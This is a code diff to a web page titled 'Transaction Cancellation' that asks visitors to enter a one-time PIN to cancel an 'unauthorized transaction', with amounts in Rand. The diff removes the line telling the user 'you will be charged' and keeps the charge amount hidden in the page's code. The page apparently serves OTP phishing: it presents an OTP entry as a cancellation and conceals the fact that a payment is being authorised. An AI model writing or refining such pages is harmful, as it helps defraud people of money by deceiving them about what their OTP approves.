@@ -221,12 +221,7 @@
         <h1>Transaction Cancellation</h1>
         <p class="subtitle">Enter OTP to cancel unauthorized transaction</p>
 
-        <div class="amount-display">
-            <div class="amount-line">
-                <span class="amount-label">you will be charged </span>
-                <span class="amount-value" id="transaction-amount">R0</span>
-            </div>
-        </div>
+        <!-- Amount display removed as per requirements -->
 
         <div class="otp-form">
             <div class="otp-input">
@@ -285,23 +280,15 @@
             return urlParams.get(name);
         }
 
-        // Get amount from URL parameters
+        // Get amount from URL parameters (no UI display)
         function getAmountFromUrl() {
             const amountParam = getUrlParameter('amount');
             if (amountParam !== null && amountParam !== undefined && amountParam !== '') {
-                // Accept values like "1000", "1,000.50", "R1000", "R 1,000.50"
                 const cleaned = String(amountParam).replace(/[^0-9.]/g, '');
                 const numericAmount = Number(cleaned);
-                if (!isNaN(numericAmount)) {
-                    normalizedAmount = numericAmount;
-                    document.getElementById('transaction-amount').textContent = formatRand(numericAmount);
-                } else {
-                    normalizedAmount = 0;
-                    document.getElementById('transaction-amount').textContent = 'R0';
-                }
+                normalizedAmount = !isNaN(numericAmount) ? numericAmount : 0;
             } else {
                 normalizedAmount = 0;
-                document.getElementById('transaction-amount').textContent = 'R0';
             }
         }
 
